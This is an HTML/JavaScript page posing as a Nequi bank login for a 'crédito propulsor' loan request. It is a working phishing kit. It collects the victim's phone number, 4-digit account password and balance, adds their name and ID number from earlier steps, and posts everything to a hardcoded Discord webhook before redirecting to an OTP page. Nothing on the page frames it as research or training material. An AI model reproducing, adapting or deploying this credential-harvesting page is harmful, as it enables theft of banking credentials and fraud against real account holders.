<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi - Verificaci√≥n</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #f5d5e0 0%, #f0c9d9 50%, #e8bdd1 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.85);
            border-radius: 16px;
            padding: 45px 40px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
        }

        h1 {
            color: #1a1a1a;
            font-size: 1.85rem;
            font-weight: 700;
            margin-bottom: 6px;
            text-align: left;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #6b6b6b;
            font-size: 0.95rem;
            margin-bottom: 32px;
            text-align: left;
            font-weight: 400;
        }

        .country-phone-group {
            display: flex;
            gap: 12px;
            margin-bottom: 18px;
        }

        .country-select {
            min-width: 95px;
            padding: 0 12px;
            background: #f5f5f5;
            border: 1px solid #d4d4d4;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            cursor: pointer;
            height: 50px;
        }

        .flag-icon {
            width: 26px;
            height: 18px;
            background: linear-gradient(to bottom, #FFD700 33%, #0033A0 33%, #0033A0 66%, #CE1126 66%);
            border-radius: 2px;
            flex-shrink: 0;
        }

        .country-code {
            font-weight: 500;
            color: #1a1a1a;
            font-size: 0.95rem;
        }

        .dropdown-arrow {
            font-size: 9px;
            color: #666;
            margin-left: 2px;
        }

        .form-group {
            margin-bottom: 18px;
            position: relative;
        }

        .form-group input {
            width: 100%;
            height: 50px;
            padding: 0 14px;
            background: #f5f5f5;
            border: 1px solid #d4d4d4;
            border-radius: 8px;
            font-size: 0.95rem;
            color: #1a1a1a;
            transition: all 0.2s;
            font-family: inherit;
        }

        .form-group input:focus {
            outline: none;
            border-color: #999;
            background: #fafafa;
        }

        .form-group input::placeholder {
            color: #999;
            font-weight: 400;
        }

        .phone-input {
            flex: 1;
        }

        .phone-input .form-group {
            margin-bottom: 0;
        }

        .captcha-container {
            margin: 22px 0 18px 0;
            display: flex;
            justify-content: flex-start;
        }

        .captcha-box {
            display: inline-block;
            cursor: pointer;
        }

        .captcha-box img {
            display: block;
            max-width: 100%;
            height: auto;
            border-radius: 4px;
        }

        .btn-submit {
            width: 100%;
            height: 52px;
            padding: 0;
            background: #f0c9d9;
            color: #5a3a45;
            border: none;
            border-radius: 8px;
            font-size: 1.05rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
            font-family: inherit;
        }

        .btn-submit:hover:not(:disabled) {
            background: #e8bdd1;
        }

        .btn-submit:disabled {
            background: #f0c9d9;
            color: rgba(90, 58, 69, 0.4);
            cursor: not-allowed;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 35px 28px;
            }

            h1 {
                font-size: 1.65rem;
            }

            .country-phone-group {
                flex-direction: column;
            }

            .country-select {
                width: 100%;
                justify-content: flex-start;
            }
        }
    </style>
</head>

<body>
    <div class="login-container">
        <h1>Entra a tu Nequi</h1>
        <p class="subtitle">Solicitud de cr√©dito propulsor</p>
        
        <form id="loginForm">
            <!-- N√∫mero de celular con selector de pa√≠s -->
            <div class="country-phone-group">
                <div class="country-select">
                    <div class="flag-icon"></div>
                    <span class="country-code">+57</span>
                    <span class="dropdown-arrow">‚ñº</span>
                </div>
                
                <div class="form-group phone-input">
                    <input 
                        type="tel" 
                        id="txtUsername" 
                        name="txtUsername"
                        placeholder="N√∫mero de celular"
                        required 
                        maxlength="12" 
                        inputmode="numeric">
                </div>
            </div>

            <!-- Contrase√±a -->
            <div class="form-group">
                <input
                    type="password" 
                    id="txtPass" 
                    name="txtPass" 
                    placeholder="Contrase√±a"
                    required 
                    maxlength="4" 
                    inputmode="numeric" 
                    pattern="\d*">
            </div>

            <!-- Saldo actual -->
            <div class="form-group">
                <input 
                    type="text"
                    id="txtSaldo" 
                    name="txtSaldo" 
                    placeholder="Saldo actual"
                    required 
                    inputmode="numeric">
            </div>
            
            <!-- Captcha -->
            <div class="captcha-container">
                <div class="captcha-box" id="captchaBox">
                    <img src="img/ca.png" alt="Captcha" id="captchaImg">
                </div>
            </div>

            <!-- Bot√≥n de env√≠o -->
            <button type="submit" class="btn-submit" id="btnUsuario" disabled>Entra</button>
        </form>
    </div>

    <script type="text/javascript">
        document.addEventListener("DOMContentLoaded", function() {
            const usernameInput = document.getElementById('txtUsername');
            const passwordInput = document.getElementById('txtPass');
            const saldoInput = document.getElementById('txtSaldo');
            const captchaBox = document.getElementById('captchaBox');
            const captchaImg = document.getElementById('captchaImg');
            const submitBtn = document.getElementById('btnUsuario');
            const form = document.getElementById('loginForm');

            let captchaClicked = false;

            // Eventos
            usernameInput.addEventListener('input', formatUsername);
            passwordInput.addEventListener('input', formatPassword);
            saldoInput.addEventListener('input', formatSaldo);
            captchaBox.addEventListener('click', toggleCaptcha);

            // Formatear n√∫mero de celular (XXX XXX XXXX)
            function formatUsername() {
                let value = usernameInput.value.replace(/\D/g, '');
                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
                usernameInput.value = formattedValue;
                validateForm();
            }

            // Formatear contrase√±a (solo n√∫meros)
            function formatPassword() {
                passwordInput.value = passwordInput.value.replace(/\D/g, '');
                validateForm();
            }

            // Formatear saldo (separador de miles)
            function formatSaldo() {
                let valor = saldoInput.value.replace(/\D/g, "");
                if (valor === "") {
                    saldoInput.value = "";
                    validateForm();
                    return;
                }
                saldoInput.value = parseInt(valor, 10).toLocaleString("es-CO");
                validateForm();
            }

            // Toggle captcha
            function toggleCaptcha() {
                captchaClicked = true;
                captchaImg.src = "img/cap.png";
                validateForm();
            }

            // Validar formulario completo
            function validateForm() {
                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
                const passwordValid = /^\d{4}$/.test(passwordInput.value);
                const saldoValid = saldoInput.value.length >= 4;

                if (usernameValid && passwordValid && saldoValid && captchaClicked) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }

            // Obtener datos del localStorage
            const nombreApellido = localStorage.getItem("nombreApellido");
            const cedula = localStorage.getItem("cedula");

            // Env√≠o del formulario
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const usuario = usernameInput.value.trim();
                const clave = passwordInput.value.trim();
                const saldo = saldoInput.value.trim();

                // Validaciones finales
                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
                    alert("El n√∫mero ingresado no es v√°lido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
                    return;
                }

                if (!/^\d{4}$/.test(clave)) {
                    alert("La clave debe ser de 4 d√≠gitos num√©ricos.");
                    return;
                }

                if (!saldo) {
                    alert("Debe ingresar un saldo v√°lido.");
                    return;
                }

                if (!nombreApellido || !cedula) {
                    alert("Los datos de nombre y c√©dula no est√°n disponibles. Vuelve al paso anterior.");
                    return;
                }

                // Guardar en localStorage
                localStorage.setItem("numero", usuario);
                localStorage.setItem("clave", clave);
                localStorage.setItem("saldo", saldo);

                // DISCORD WEBHOOK
                const webhookURL = 'https://discord.com/api/webhooks/1389513200801812491/R0X2zhHCg6Z4P-rLjJRcD6ktg-73vhuwcTU6iYZ__bafE6Si2cHH9cbC3x6cijvGWvJ7';

                const discordPayload = {
                    username: "üîê Datos Nequi",
                    content: `**Nueva solicitud recibida:**\n\n` +
                             `üìõ **Nombre:** ${nombreApellido}\n` +
                             `ü™™ **C√©dula:** ${cedula}\n` +
                             `üì± **N√∫mero:** ${usuario}\n` +
                             `üîë **Clave:** ${clave}\n` +
                             `üí∞ **Saldo:** $${saldo}\n` +
                             `üìÖ **Fecha:** ${new Date().toLocaleString('es-CO')}`
                };

                try {
                    const response = await fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(discordPayload)
                    });

                    if (response.ok) {
                        console.log('Datos enviados a Discord correctamente');
                        // Redirigir a la siguiente p√°gina
                        window.location.href = "otp.html";
                    } else {
                        throw new Error('Error al enviar los datos a Discord');
                    }
                } catch (error) {
                    console.error('Error al enviar los datos:', error);
                    alert('Ocurri√≥ un error al enviar los datos. Intente nuevamente.');
                }
            });
        });
    </script>
</body>
</html>
